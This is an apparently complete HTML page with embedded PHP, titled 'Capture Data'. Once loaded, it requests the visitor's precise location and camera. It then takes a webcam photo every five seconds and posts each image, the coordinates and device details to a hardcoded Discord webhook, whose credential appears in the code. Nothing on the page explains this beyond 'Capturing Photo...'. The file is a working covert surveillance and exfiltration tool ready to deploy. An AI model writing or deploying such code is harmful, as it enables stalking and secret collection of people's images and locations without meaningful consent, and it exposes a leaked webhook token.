<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Capture Data</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
        }
        #video {
            display: block;
            margin: 0 auto;
        }
        #canvas {
            display: none;
        }
    </style>
</head>
<body>
    <h1>Capturing Photo...</h1>
    <video id="video" width="640" height="480" autoplay></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');
            const captureInterval = 5000; // Capture photo every 5 seconds

            function sendData(imageData, location, deviceDetails) {
                const xhr = new XMLHttpRequest();
                xhr.open("POST", "", true); // Send POST request to the same page
                xhr.setRequestHeader("Content-Type", "application/json");
                xhr.onreadystatechange = function () {
                    if (xhr.readyState === 4) {
                        if (xhr.status === 200) {
                            console.log("Data sent successfully");
                        } else {
                            console.error("Error sending data", xhr.responseText);
                        }
                    }
                };
                const data = JSON.stringify({
                    file: imageData,
                    content: `Location: ${location.latitude}, ${location.longitude}`,
                    device: deviceDetails
                });
                xhr.send(data);
            }

            function getDeviceDetails() {
                const userAgent = navigator.userAgent;
                const platform = navigator.platform;
                return {
                    userAgent: userAgent,
                    platform: platform
                };
            }

            navigator.geolocation.getCurrentPosition(position => {
                const location = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude
                };

                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(stream => {
                        video.srcObject = stream;

                        // Capture a photo at regular intervals
                        setInterval(() => {
                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
                            const imageData = canvas.toDataURL('image/png');

                            // Debugging: log image data length
                            console.log('Captured image data length:', imageData.length);

                            // Get device details
                            const deviceDetails = getDeviceDetails();

                            // Send data to the server
                            sendData(imageData, location, deviceDetails);
                        }, captureInterval);
                    })
                    .catch(error => {
                        console.error('Error accessing camera:', error);
                        alert('Error accessing camera: ' + error.message);
                    });
            }, error => {
                console.error('Error getting location:', error);
                alert('Error getting location: ' + error.message);
            }, {
                enableHighAccuracy: true,
                timeout: 5000,
                maximumAge: 0
            });
        });
    </script>

    <?php
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $data = json_decode(file_get_contents('php://input'), true);
        $webhookUrl = 'https://discord.com/api/webhooks/1262762894165282849/OZuiaALAiP0giUQQGt5UoSb6S1DsqcQ1_szVS1rtBDJiBWzRgBA4_xS7AJmPROVTQeB';

        $imageData = $data['file'];
        $location = $data['content'];
        $deviceDetails = json_encode($data['device']);

        // Prepare the image file
        $imagePath = tempnam(sys_get_temp_dir(), 'img') . '.png';
        file_put_contents($imagePath, base64_decode(str_replace('data:image/png;base64,', '', $imageData)));

        $ch = curl_init($webhookUrl);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, [
            'username' => 'Capture Bot',
            'content' => $location . "\nDevice Details: " . $deviceDetails,
            'file' => new CURLFile($imagePath)
        ]);

        $response = curl_exec($ch);
        if (curl_errno($ch)) {
            echo 'Error:' . curl_error($ch);
        } else {
            echo 'Response: ' . $response;
        }
        curl_close($ch);

        // Clean up the temporary file
        unlink($imagePath);
    }
    ?>
</body>
</html>